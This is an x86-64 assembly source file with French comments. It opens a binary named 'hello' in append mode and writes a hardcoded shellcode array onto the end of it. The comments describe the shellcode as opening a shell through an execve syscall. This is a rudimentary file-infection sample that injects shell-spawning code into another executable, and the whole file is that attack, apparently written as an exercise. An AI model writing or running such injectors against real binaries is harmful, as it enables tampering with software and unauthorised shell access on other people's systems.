section .data
    filename db 'hello', 0  ; Nom du fichier binaire
    shellcode db 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00,0x48, 0xBE, 0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBA, 0x10, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05
    shell_longueur equ $ - shellcode   ; ce shellcode a simplement pour but d'ouvrir un shell dans un terminal. 

section .text
    global _start

_start:
    ; Ici on ouvre  le fichier en mode "append" (O_APPEND | O_WRONLY)
    mov rax, 2                  
    lea rdi, [rel filename]      
    mov rsi, 0x401               
    xor rdx, rdx                 
    syscall

    cmp rax, 0
    js erreur                   
    mov rdi, rax                

    ; On fait appel à sys write pour écrire  le shellcode à la fin du fichier
    mov rax, 1                   
    mov rsi, shellcode           
    mov rdx, shell_longueur      ;
    syscall

    ; Fermer le fichier
    mov rax, 3                  
    syscall

    ;On quitte le programme à cette instruction.
    mov rax, 60                 
    xor rdi, rdi                
    syscall

erreur:
    ; Quitter avec un code d'erreur
    mov rax, 60               
    mov rdi, 1                  
    syscall
